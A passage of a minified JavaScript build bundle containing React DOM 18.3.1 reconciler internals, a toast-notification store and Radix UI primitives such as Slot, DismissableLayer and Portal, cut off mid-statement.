15:Bl(9,l)}}catch(_){Ue(l,l.return,_)}if(l===o){G=null;break e}var j=l.sibling;if(j!==null){j.return=l.return,G=j;break e}G=l.return}}if(xe=s,In(),Nr&&typeof Nr.onPostCommitFiberRoot=="function")try{Nr.onPostCommitFiberRoot(Ll,t)}catch{}n=!0}return n}finally{je=r,Wt.transition=e}}return!1}function Rm(t,e,r){e=ya(r,e),e=Gg(t,e,1),t=xn(t,e,1),e=mt(),t!==null&&(Gi(t,1,e),Nt(t,e))}function Ue(t,e,r){if(t.tag===3)Rm(t,t,r);else for(;e!==null;){if(e.tag===3){Rm(e,t,r);break}else if(e.tag===1){var n=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof n.componentDidCatch=="function"&&(yn===null||!yn.has(n))){t=ya(r,t),t=Wg(e,t,1),e=xn(e,t,1),t=mt(),e!==null&&(Gi(e,1,t),Nt(e,t));break}}e=e.return}}function A1(t,e,r){var n=t.pingCache;n!==null&&n.delete(e),e=mt(),t.pingedLanes|=t.suspendedLanes&r,Qe===t&&(et&r)===r&&(He===4||He===3&&(et&130023424)===et&&500>De()-Rh?us(t,0):Ah|=r),Nt(t,e)}function hx(t,e){e===0&&(t.mode&1?(e=oo,oo<<=1,!(oo&130023424)&&(oo=4194304)):e=1);var r=mt();t=Fr(t,e),t!==null&&(Gi(t,e,r),Nt(t,r))}function R1(t){var e=t.memoizedState,r=0;e!==null&&(r=e.retryLane),hx(t,r)}function I1(t,e){var r=0;switch(t.tag){case 13:var n=t.stateNode,s=t.memoizedState;s!==null&&(r=s.retryLane);break;case 19:n=t.stateNode;break;default:throw Error(D(314))}n!==null&&n.delete(e),hx(t,r)}var fx;fx=function(t,e,r){if(t!==null)if(t.memoizedProps!==e.pendingProps||jt.current)wt=!0;else{if(!(t.lanes&r)&&!(e.flags&128))return wt=!1,b1(t,e,r);wt=!!(t.flags&131072)}else wt=!1,Ie&&e.flags&1048576&&xg(e,al,e.index);switch(e.lanes=0,e.tag){case 2:var n=e.type;$o(t,e),t=e.pendingProps;var s=ma(e,dt.current);Zs(e,r),s=Sh(null,e,n,t,s,r);var i=kh();return e.flags|=1,typeof s=="object"&&s!==null&&typeof s.render=="function"&&s.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,_t(n)?(i=!0,nl(e)):i=!1,e.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,bh(e),s.updater=Fl,e.stateNode=s,s._reactInternals=e,Vd(e,n,t,r),e=Wd(null,e,n,!0,i,r)):(e.tag=0,Ie&&i&&fh(e),ht(null,e,s,r),e=e.child),e;case 16:n=e.elementType;e:{switch($o(t,e),t=e.pendingProps,s=n._init,n=s(n._payload),e.type=n,s=e.tag=M1(n),t=Zt(n,t),s){case 0:e=Gd(null,e,n,t,r);break e;case 1:e=jm(null,e,n,t,r);break e;case 11:e=bm(null,e,n,t,r);break e;case 14:e=wm(null,e,n,Zt(n.type,t),r);break e}throw Error(D(306,n,""))}return e;case 0:return n=e.type,s=e.pendingProps,s=e.elementType===n?s:Zt(n,s),Gd(t,e,n,s,r);case 1:return n=e.type,s=e.pendingProps,s=e.elementType===n?s:Zt(n,s),jm(t,e,n,s,r);case 3:e:{if(Yg(e),t===null)throw Error(D(387));n=e.pendingProps,i=e.memoizedState,s=i.element,_g(t,e),ll(e,n,null,r);var o=e.memoizedState;if(n=o.element,i.isDehydrated)if(i={element:n,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=i,e.memoizedState=i,e.flags&256){s=ya(Error(D(423)),e),e=_m(t,e,n,r,s);break e}else if(n!==s){s=ya(Error(D(424)),e),e=_m(t,e,n,r,s);break e}else for(Pt=gn(e.stateNode.containerInfo.firstChild),At=e,Ie=!0,sr=null,r=wg(e,null,n,r),e.child=r;r;)r.flags=r.flags&-3|4096,r=r.sibling;else{if(pa(),n===s){e=Br(t,e,r);break e}ht(t,e,n,r)}e=e.child}return e;case 5:return Ng(e),t===null&&zd(e),n=e.type,s=e.pendingProps,i=t!==null?t.memoizedProps:null,o=s.children,Md(n,s)?o=null:i!==null&&Md(n,i)&&(e.flags|=32),Qg(t,e),ht(t,e,o,r),e.child;case 6:return t===null&&zd(e),null;case 13:return Jg(t,e,r);case 4:return wh(e,e.stateNode.containerInfo),n=e.pendingProps,t===null?e.child=ga(e,null,n,r):ht(t,e,n,r),e.child;case 11:return n=e.type,s=e.pendingProps,s=e.elementType===n?s:Zt(n,s),bm(t,e,n,s,r);case 7:return ht(t,e,e.pendingProps,r),e.child;case 8:return ht(t,e,e.pendingProps.children,r),e.child;case 12:return ht(t,e,e.pendingProps.children,r),e.child;case 10:e:{if(n=e.type._context,s=e.pendingProps,i=e.memoizedProps,o=s.value,Ce(il,n._currentValue),n._currentValue=o,i!==null)if(dr(i.value,o)){if(i.children===s.children&&!jt.current){e=Br(t,e,r);break e}}else for(i=e.child,i!==null&&(i.return=e);i!==null;){var l=i.dependencies;if(l!==null){o=i.child;for(var c=l.firstContext;c!==null;){if(c.context===n){if(i.tag===1){c=$r(-1,r&-r),c.tag=2;var d=i.updateQueue;if(d!==null){d=d.shared;var u=d.pending;u===null?c.next=c:(c.next=u.next,u.next=c),d.pending=c}}i.lanes|=r,c=i.alternate,c!==null&&(c.lanes|=r),Fd(i.return,r,e),l.lanes|=r;break}c=c.next}}else if(i.tag===10)o=i.type===e.type?null:i.child;else if(i.tag===18){if(o=i.return,o===null)throw Error(D(341));o.lanes|=r,l=o.alternate,l!==null&&(l.lanes|=r),Fd(o,r,e),o=i.sibling}else o=i.child;if(o!==null)o.return=i;else for(o=i;o!==null;){if(o===e){o=null;break}if(i=o.sibling,i!==null){i.return=o.return,o=i;break}o=o.return}i=o}ht(t,e,s.children,r),e=e.child}return e;case 9:return s=e.type,n=e.pendingProps.children,Zs(e,r),s=qt(s),n=n(s),e.flags|=1,ht(t,e,n,r),e.child;case 14:return n=e.type,s=Zt(n,e.pendingProps),s=Zt(n.type,s),wm(t,e,n,s,r);case 15:return Kg(t,e,e.type,e.pendingProps,r);case 17:return n=e.type,s=e.pendingProps,s=e.elementType===n?s:Zt(n,s),$o(t,e),e.tag=1,_t(n)?(t=!0,nl(e)):t=!1,Zs(e,r),Hg(e,n,s),Vd(e,n,s,r),Wd(null,e,n,!0,t,r);case 19:return Xg(t,e,r);case 22:return qg(t,e,r)}throw Error(D(156,e.tag))};function mx(t,e){return Fp(t,e)}function L1(t,e,r,n){this.tag=t,this.key=r,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=n,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Gt(t,e,r,n){return new L1(t,e,r,n)}function Oh(t){return t=t.prototype,!(!t||!t.isReactComponent)}function M1(t){if(typeof t=="function")return Oh(t)?1:0;if(t!=null){if(t=t.$$typeof,t===th)return 11;if(t===rh)return 14}return 2}function bn(t,e){var r=t.alternate;return r===null?(r=Gt(t.tag,e,t.key,t.mode),r.elementType=t.elementType,r.type=t.type,r.stateNode=t.stateNode,r.alternate=t,t.alternate=r):(r.pendingProps=e,r.type=t.type,r.flags=0,r.subtreeFlags=0,r.deletions=null),r.flags=t.flags&14680064,r.childLanes=t.childLanes,r.lanes=t.lanes,r.child=t.child,r.memoizedProps=t.memoizedProps,r.memoizedState=t.memoizedState,r.updateQueue=t.updateQueue,e=t.dependencies,r.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},r.sibling=t.sibling,r.index=t.index,r.ref=t.ref,r}function zo(t,e,r,n,s,i){var o=2;if(n=t,typeof t=="function")Oh(t)&&(o=1);else if(typeof t=="string")o=5;else e:switch(t){case $s:return hs(r.children,s,i,e);case eh:o=8,s|=8;break;case fd:return t=Gt(12,r,e,s|2),t.elementType=fd,t.lanes=i,t;case md:return t=Gt(13,r,e,s),t.elementType=md,t.lanes=i,t;case pd:return t=Gt(19,r,e,s),t.elementType=pd,t.lanes=i,t;case Np:return Hl(r,s,i,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case jp:o=10;break e;case _p:o=9;break e;case th:o=11;break e;case rh:o=14;break e;case Zr:o=16,n=null;break e}throw Error(D(130,t==null?t:typeof t,""))}return e=Gt(o,r,e,s),e.elementType=t,e.type=n,e.lanes=i,e}function hs(t,e,r,n){return t=Gt(7,t,n,e),t.lanes=r,t}function Hl(t,e,r,n){return t=Gt(22,t,n,e),t.elementType=Np,t.lanes=r,t.stateNode={isHidden:!1},t}function Kc(t,e,r){return t=Gt(6,t,null,e),t.lanes=r,t}function qc(t,e,r){return e=Gt(4,t.children!==null?t.children:[],t.key,e),e.lanes=r,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function O1(t,e,r,n,s){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Cc(0),this.expirationTimes=Cc(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Cc(0),this.identifierPrefix=n,this.onRecoverableError=s,this.mutableSourceEagerHydrationData=null}function $h(t,e,r,n,s,i,o,l,c){return t=new O1(t,e,r,l,c),e===1?(e=1,i===!0&&(e|=8)):e=0,i=Gt(3,null,null,e),t.current=i,i.stateNode=t,i.memoizedState={element:n,isDehydrated:r,cache:null,transitions:null,pendingSuspenseBoundaries:null},bh(i),t}function $1(t,e,r){var n=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Os,key:n==null?null:""+n,children:t,containerInfo:e,implementation:r}}function px(t){if(!t)return jn;t=t._reactInternals;e:{if(ws(t)!==t||t.tag!==1)throw Error(D(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(_t(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(D(171))}if(t.tag===1){var r=t.type;if(_t(r))return pg(t,r,e)}return e}function gx(t,e,r,n,s,i,o,l,c){return t=$h(r,n,!0,t,s,i,o,l,c),t.context=px(null),r=t.current,n=mt(),s=vn(r),i=$r(n,s),i.callback=e??null,xn(r,i,s),t.current.lanes=s,Gi(t,s,n),Nt(t,n),t}function Gl(t,e,r,n){var s=e.current,i=mt(),o=vn(s);return r=px(r),e.context===null?e.context=r:e.pendingContext=r,e=$r(i,o),e.payload={element:t},n=n===void 0?null:n,n!==null&&(e.callback=n),t=xn(s,e,o),t!==null&&(lr(t,s,o,i),Lo(t,s,o)),o}function gl(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function Im(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var r=t.retryLane;t.retryLane=r!==0&&r<e?r:e}}function Uh(t,e){Im(t,e),(t=t.alternate)&&Im(t,e)}function U1(){return null}var xx=typeof reportError=="function"?reportError:function(t){console.error(t)};function Dh(t){this._internalRoot=t}Wl.prototype.render=Dh.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(D(409));Gl(t,e,null,null)};Wl.prototype.unmount=Dh.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;ys(function(){Gl(null,t,null,null)}),e[zr]=null}};function Wl(t){this._internalRoot=t}Wl.prototype.unstable_scheduleHydration=function(t){if(t){var e=qp();t={blockedOn:null,target:t,priority:e};for(var r=0;r<tn.length&&e!==0&&e<tn[r].priority;r++);tn.splice(r,0,t),r===0&&Yp(t)}};function zh(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function Kl(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Lm(){}function D1(t,e,r,n,s){if(s){if(typeof n=="function"){var i=n;n=function(){var d=gl(o);i.call(d)}}var o=gx(e,n,t,0,null,!1,!1,"",Lm);return t._reactRootContainer=o,t[zr]=o.current,vi(t.nodeType===8?t.parentNode:t),ys(),o}for(;s=t.lastChild;)t.removeChild(s);if(typeof n=="function"){var l=n;n=function(){var d=gl(c);l.call(d)}}var c=$h(t,0,!1,null,null,!1,!1,"",Lm);return t._reactRootContainer=c,t[zr]=c.current,vi(t.nodeType===8?t.parentNode:t),ys(function(){Gl(e,c,r,n)}),c}function ql(t,e,r,n,s){var i=r._reactRootContainer;if(i){var o=i;if(typeof s=="function"){var l=s;s=function(){var c=gl(o);l.call(c)}}Gl(e,o,t,s)}else o=D1(r,e,t,s,n);return gl(o)}Wp=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var r=Ya(e.pendingLanes);r!==0&&(ah(e,r|1),Nt(e,De()),!(xe&6)&&(va=De()+500,In()))}break;case 13:ys(function(){var n=Fr(t,1);if(n!==null){var s=mt();lr(n,t,1,s)}}),Uh(t,1)}};ih=function(t){if(t.tag===13){var e=Fr(t,134217728);if(e!==null){var r=mt();lr(e,t,134217728,r)}Uh(t,134217728)}};Kp=function(t){if(t.tag===13){var e=vn(t),r=Fr(t,e);if(r!==null){var n=mt();lr(r,t,e,n)}Uh(t,e)}};qp=function(){return je};Qp=function(t,e){var r=je;try{return je=t,e()}finally{je=r}};Sd=function(t,e,r){switch(e){case"input":if(yd(t,r),e=r.name,r.type==="radio"&&e!=null){for(r=t;r.parentNode;)r=r.parentNode;for(r=r.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<r.length;e++){var n=r[e];if(n!==t&&n.form===t.form){var s=Ul(n);if(!s)throw Error(D(90));kp(n),yd(n,s)}}}break;case"textarea":Cp(t,r);break;case"select":e=r.value,e!=null&&Qs(t,!!r.multiple,e,!1)}};Mp=Ih;Op=ys;var z1={usingClientEntryPoint:!1,Events:[Ki,Fs,Ul,Ip,Lp,Ih]},Va={findFiberByHostInstance:ns,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},F1={bundleType:Va.bundleType,version:Va.version,rendererPackageName:Va.rendererPackageName,rendererConfig:Va.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Gr.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=Dp(t),t===null?null:t.stateNode},findFiberByHostInstance:Va.findFiberByHostInstance||U1,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var vo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!vo.isDisabled&&vo.supportsFiber)try{Ll=vo.inject(F1),Nr=vo}catch{}}Mt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=z1;Mt.createPortal=function(t,e){var r=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!zh(e))throw Error(D(200));return $1(t,e,null,r)};Mt.createRoot=function(t,e){if(!zh(t))throw Error(D(299));var r=!1,n="",s=xx;return e!=null&&(e.unstable_strictMode===!0&&(r=!0),e.identifierPrefix!==void 0&&(n=e.identifierPrefix),e.onRecoverableError!==void 0&&(s=e.onRecoverableError)),e=$h(t,1,!1,null,null,r,!1,n,s),t[zr]=e.current,vi(t.nodeType===8?t.parentNode:t),new Dh(e)};Mt.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(D(188)):(t=Object.keys(t).join(","),Error(D(268,t)));return t=Dp(e),t=t===null?null:t.stateNode,t};Mt.flushSync=function(t){return ys(t)};Mt.hydrate=function(t,e,r){if(!Kl(e))throw Error(D(200));return ql(null,t,e,!0,r)};Mt.hydrateRoot=function(t,e,r){if(!zh(t))throw Error(D(405));var n=r!=null&&r.hydratedSources||null,s=!1,i="",o=xx;if(r!=null&&(r.unstable_strictMode===!0&&(s=!0),r.identifierPrefix!==void 0&&(i=r.identifierPrefix),r.onRecoverableError!==void 0&&(o=r.onRecoverableError)),e=gx(e,null,t,1,r??null,s,!1,i,o),t[zr]=e.current,vi(t),n)for(t=0;t<n.length;t++)r=n[t],s=r._getVersion,s=s(r._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[r,s]:e.mutableSourceEagerHydrationData.push(r,s);return new Wl(e)};Mt.render=function(t,e,r){if(!Kl(e))throw Error(D(200));return ql(null,t,e,!1,r)};Mt.unmountComponentAtNode=function(t){if(!Kl(t))throw Error(D(40));return t._reactRootContainer?(ys(function(){ql(null,null,t,!1,function(){t._reactRootContainer=null,t[zr]=null})}),!0):!1};Mt.unstable_batchedUpdates=Ih;Mt.unstable_renderSubtreeIntoContainer=function(t,e,r,n){if(!Kl(r))throw Error(D(200));if(t==null||t._reactInternals===void 0)throw Error(D(38));return ql(t,e,r,!1,n)};Mt.version="18.3.1-next-f1338f8080-20240426";function yx(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(yx)}catch(t){console.error(t)}}yx(),yp.exports=Mt;var Qi=yp.exports;const vx=ap(Qi);var bx,Mm=Qi;bx=Mm.createRoot,Mm.hydrateRoot;const B1=1,V1=1e6;let Qc=0;function H1(){return Qc=(Qc+1)%Number.MAX_SAFE_INTEGER,Qc.toString()}const Yc=new Map,Om=t=>{if(Yc.has(t))return;const e=setTimeout(()=>{Yc.delete(t),li({type:"REMOVE_TOAST",toastId:t})},V1);Yc.set(t,e)},G1=(t,e)=>{switch(e.type){case"ADD_TOAST":return{...t,toasts:[e.toast,...t.toasts].slice(0,B1)};case"UPDATE_TOAST":return{...t,toasts:t.toasts.map(r=>r.id===e.toast.id?{...r,...e.toast}:r)};case"DISMISS_TOAST":{const{toastId:r}=e;return r?Om(r):t.toasts.forEach(n=>{Om(n.id)}),{...t,toasts:t.toasts.map(n=>n.id===r||r===void 0?{...n,open:!1}:n)}}case"REMOVE_TOAST":return e.toastId===void 0?{...t,toasts:[]}:{...t,toasts:t.toasts.filter(r=>r.id!==e.toastId)}}},Fo=[];let Bo={toasts:[]};function li(t){Bo=G1(Bo,t),Fo.forEach(e=>{e(Bo)})}function W1({...t}){const e=H1(),r=s=>li({type:"UPDATE_TOAST",toast:{...s,id:e}}),n=()=>li({type:"DISMISS_TOAST",toastId:e});return li({type:"ADD_TOAST",toast:{...t,id:e,open:!0,onOpenChange:s=>{s||n()}}}),{id:e,dismiss:n,update:r}}function Ln(){const[t,e]=p.useState(Bo);return p.useEffect(()=>(Fo.push(e),()=>{const r=Fo.indexOf(e);r>-1&&Fo.splice(r,1)}),[t]),{...t,toast:W1,dismiss:r=>li({type:"DISMISS_TOAST",toastId:r})}}function Ne(t,e,{checkForDefaultPrevented:r=!0}={}){return function(s){if(t==null||t(s),r===!1||!s.defaultPrevented)return e==null?void 0:e(s)}}function K1(t,e){typeof t=="function"?t(e):t!=null&&(t.current=e)}function wx(...t){return e=>t.forEach(r=>K1(r,e))}function Yt(...t){return p.useCallback(wx(...t),t)}function q1(t,e=[]){let r=[];function n(i,o){const l=p.createContext(o),c=r.length;r=[...r,o];function d(h){const{scope:f,children:m,...g}=h,v=(f==null?void 0:f[t][c])||l,w=p.useMemo(()=>g,Object.values(g));return a.jsx(v.Provider,{value:w,children:m})}function u(h,f){const m=(f==null?void 0:f[t][c])||l,g=p.useContext(m);if(g)return g;if(o!==void 0)return o;throw new Error(`\`${h}\` must be used within \`${i}\``)}return d.displayName=i+"Provider",[d,u]}const s=()=>{const i=r.map(o=>p.createContext(o));return function(l){const c=(l==null?void 0:l[t])||i;return p.useMemo(()=>({[`__scope${t}`]:{...l,[t]:c}}),[l,c])}};return s.scopeName=t,[n,Q1(s,...e)]}function Q1(...t){const e=t[0];if(t.length===1)return e;const r=()=>{const n=t.map(s=>({useScope:s(),scopeName:s.scopeName}));return function(i){const o=n.reduce((l,{useScope:c,scopeName:d})=>{const h=c(i)[`__scope${d}`];return{...l,...h}},{});return p.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return r.scopeName=e.scopeName,r}var Ci=p.forwardRef((t,e)=>{const{children:r,...n}=t,s=p.Children.toArray(r),i=s.find(Y1);if(i){const o=i.props.children,l=s.map(c=>c===i?p.Children.count(o)>1?p.Children.only(null):p.isValidElement(o)?o.props.children:null:c);return a.jsx(su,{...n,ref:e,children:p.isValidElement(o)?p.cloneElement(o,void 0,l):null})}return a.jsx(su,{...n,ref:e,children:r})});Ci.displayName="Slot";var su=p.forwardRef((t,e)=>{const{children:r,...n}=t;if(p.isValidElement(r)){const s=X1(r);return p.cloneElement(r,{...J1(n,r.props),ref:e?wx(e,s):s})}return p.Children.count(r)>1?p.Children.only(null):null});su.displayName="SlotClone";var jx=({children:t})=>a.jsx(a.Fragment,{children:t});function Y1(t){return p.isValidElement(t)&&t.type===jx}function J1(t,e){const r={...e};for(const n in e){const s=t[n],i=e[n];/^on[A-Z]/.test(n)?s&&i?r[n]=(...l)=>{i(...l),s(...l)}:s&&(r[n]=s):n==="style"?r[n]={...s,...i}:n==="className"&&(r[n]=[s,i].filter(Boolean).join(" "))}return{...t,...r}}function X1(t){var n,s;let e=(n=Object.getOwnPropertyDescriptor(t.props,"ref"))==null?void 0:n.get,r=e&&"isReactWarning"in e&&e.isReactWarning;return r?t.ref:(e=(s=Object.getOwnPropertyDescriptor(t,"ref"))==null?void 0:s.get,r=e&&"isReactWarning"in e&&e.isReactWarning,r?t.props.ref:t.props.ref||t.ref)}function _x(t){const e=t+"CollectionProvider",[r,n]=q1(e),[s,i]=r(e,{collectionRef:{current:null},itemMap:new Map}),o=m=>{const{scope:g,children:v}=m,w=F.useRef(null),y=F.useRef(new Map).current;return a.jsx(s,{scope:g,itemMap:y,collectionRef:w,children:v})};o.displayName=e;const l=t+"CollectionSlot",c=F.forwardRef((m,g)=>{const{scope:v,children:w}=m,y=i(l,v),x=Yt(g,y.collectionRef);return a.jsx(Ci,{ref:x,children:w})});c.displayName=l;const d=t+"CollectionItemSlot",u="data-radix-collection-item",h=F.forwardRef((m,g)=>{const{scope:v,children:w,...y}=m,x=F.useRef(null),b=Yt(g,x),j=i(d,v);return F.useEffect(()=>(j.itemMap.set(x,{ref:x,...y}),()=>void j.itemMap.delete(x))),a.jsx(Ci,{[u]:"",ref:b,children:w})});h.displayName=d;function f(m){const g=i(t+"CollectionConsumer",m);return F.useCallback(()=>{const w=g.collectionRef.current;if(!w)return[];const y=Array.from(w.querySelectorAll(`[${u}]`));return Array.from(g.itemMap.values()).sort((j,_)=>y.indexOf(j.ref.current)-y.indexOf(_.ref.current))},[g.collectionRef,g.itemMap])}return[{Provider:o,Slot:c,ItemSlot:h},f,n]}function Fh(t,e=[]){let r=[];function n(i,o){const l=p.createContext(o),c=r.length;r=[...r,o];const d=h=>{var y;const{scope:f,children:m,...g}=h,v=((y=f==null?void 0:f[t])==null?void 0:y[c])||l,w=p.useMemo(()=>g,Object.values(g));return a.jsx(v.Provider,{value:w,children:m})};d.displayName=i+"Provider";function u(h,f){var v;const m=((v=f==null?void 0:f[t])==null?void 0:v[c])||l,g=p.useContext(m);if(g)return g;if(o!==void 0)return o;throw new Error(`\`${h}\` must be used within \`${i}\``)}return[d,u]}const s=()=>{const i=r.map(o=>p.createContext(o));return function(l){const c=(l==null?void 0:l[t])||i;return p.useMemo(()=>({[`__scope${t}`]:{...l,[t]:c}}),[l,c])}};return s.scopeName=t,[n,Z1(s,...e)]}function Z1(...t){const e=t[0];if(t.length===1)return e;const r=()=>{const n=t.map(s=>({useScope:s(),scopeName:s.scopeName}));return function(i){const o=n.reduce((l,{useScope:c,scopeName:d})=>{const h=c(i)[`__scope${d}`];return{...l,...h}},{});return p.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return r.scopeName=e.scopeName,r}var ej=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","span","svg","ul"],ze=ej.reduce((t,e)=>{const r=p.forwardRef((n,s)=>{const{asChild:i,...o}=n,l=i?Ci:e;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),a.jsx(l,{...o,ref:s})});return r.displayName=`Primitive.${e}`,{...t,[e]:r}},{});function Nx(t,e){t&&Qi.flushSync(()=>t.dispatchEvent(e))}function ur(t){const e=p.useRef(t);return p.useEffect(()=>{e.current=t}),p.useMemo(()=>(...r)=>{var n;return(n=e.current)==null?void 0:n.call(e,...r)},[])}function tj(t,e=globalThis==null?void 0:globalThis.document){const r=ur(t);p.useEffect(()=>{const n=s=>{s.key==="Escape"&&r(s)};return e.addEventListener("keydown",n,{capture:!0}),()=>e.removeEventListener("keydown",n,{capture:!0})},[r,e])}var rj="DismissableLayer",au="dismissableLayer.update",nj="dismissableLayer.pointerDownOutside",sj="dismissableLayer.focusOutside",$m,Sx=p.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),Bh=p.forwardRef((t,e)=>{const{disableOutsidePointerEvents:r=!1,onEscapeKeyDown:n,onPointerDownOutside:s,onFocusOutside:i,onInteractOutside:o,onDismiss:l,...c}=t,d=p.useContext(Sx),[u,h]=p.useState(null),f=(u==null?void 0:u.ownerDocument)??(globalThis==null?void 0:globalThis.document),[,m]=p.useState({}),g=Yt(e,S=>h(S)),v=Array.from(d.layers),[w]=[...d.layersWithOutsidePointerEventsDisabled].slice(-1),y=v.indexOf(w),x=u?v.indexOf(u):-1,b=d.layersWithOutsidePointerEventsDisabled.size>0,j=x>=y,_=ij(S=>{const k=S.target,C=[...d.branches].some(T=>T.contains(k));!j||C||(s==null||s(S),o==null||o(S),S.defaultPrevented||l==null||l())},f),N=oj(S=>{const k=S.target;[...d.branches].some(T=>T.contains(k))||(i==null||i(S),o==null||o(S),S.defaultPrevented||l==null||l())},f);return tj(S=>{x===d.layers.size-1&&(n==null||n(S),!S.defaultPrevented&&l&&(S.preventDefault(),l()))},f),p.useEffect(()=>{if(u)return r&&(d.layersWithOutsidePointerEventsDisabled.size===0&&($m=f.body.style.pointerEvents,f.body.style.pointerEvents="none"),d.layersWithOutsidePointerEventsDisabled.add(u)),d.layers.add(u),Um(),()=>{r&&d.layersWithOutsidePointerEventsDisabled.size===1&&(f.body.style.pointerEvents=$m)}},[u,f,r,d]),p.useEffect(()=>()=>{u&&(d.layers.delete(u),d.layersWithOutsidePointerEventsDisabled.delete(u),Um())},[u,d]),p.useEffect(()=>{const S=()=>m({});return document.addEventListener(au,S),()=>document.removeEventListener(au,S)},[]),a.jsx(ze.div,{...c,ref:g,style:{pointerEvents:b?j?"auto":"none":void 0,...t.style},onFocusCapture:Ne(t.onFocusCapture,N.onFocusCapture),onBlurCapture:Ne(t.onBlurCapture,N.onBlurCapture),onPointerDownCapture:Ne(t.onPointerDownCapture,_.onPointerDownCapture)})});Bh.displayName=rj;var aj="DismissableLayerBranch",kx=p.forwardRef((t,e)=>{const r=p.useContext(Sx),n=p.useRef(null),s=Yt(e,n);return p.useEffect(()=>{const i=n.current;if(i)return r.branches.add(i),()=>{r.branches.delete(i)}},[r.branches]),a.jsx(ze.div,{...t,ref:s})});kx.displayName=aj;function ij(t,e=globalThis==null?void 0:globalThis.document){const r=ur(t),n=p.useRef(!1),s=p.useRef(()=>{});return p.useEffect(()=>{const i=l=>{if(l.target&&!n.current){let c=function(){Ex(nj,r,d,{discrete:!0})};const d={originalEvent:l};l.pointerType==="touch"?(e.removeEventListener("click",s.current),s.current=c,e.addEventListener("click",s.current,{once:!0})):c()}else e.removeEventListener("click",s.current);n.current=!1},o=window.setTimeout(()=>{e.addEventListener("pointerdown",i)},0);return()=>{window.clearTimeout(o),e.removeEventListener("pointerdown",i),e.removeEventListener("click",s.current)}},[e,r]),{onPointerDownCapture:()=>n.current=!0}}function oj(t,e=globalThis==null?void 0:globalThis.document){const r=ur(t),n=p.useRef(!1);return p.useEffect(()=>{const s=i=>{i.target&&!n.current&&Ex(sj,r,{originalEvent:i},{discrete:!1})};return e.addEventListener("focusin",s),()=>e.removeEventListener("focusin",s)},[e,r]),{onFocusCapture:()=>n.current=!0,onBlurCapture:()=>n.current=!1}}function Um(){const t=new CustomEvent(au);document.dispatchEvent(t)}function Ex(t,e,r,{discrete:n}){const s=r.originalEvent.target,i=new CustomEvent(t,{bubbles:!1,cancelable:!0,detail:r});e&&s.addEventListener(t,e,{once:!0}),n?Nx(s,i):s.dispatchEvent(i)}var lj=Bh,cj=kx,_n=globalThis!=null&&globalThis.document?p.useLayoutEffect:()=>{},dj="Portal",Cx=p.forwardRef((t,e)=>{var l;const{container:r,...n}=t,[s,i]=p.useState(!1);_n(()=>i(!0),[]);const o=r||s&&((l=globalThis==null?void 0:globalThis.document)==null?void 0:l.body);return o?vx.createPortal(a.jsx(ze.div,{...n,ref:e}),o):null});Cx.displayName=dj;function uj(t,e){return p.useReducer((r,n)=>e[r][n]??r,t)}var Ql=t=>{const{present:e,children:r}=t,n=hj(e),s=typeof r=="function"?r({present:n.isPresent}):p.Children.only(r),i=Yt(n.ref,fj(s));return typeof 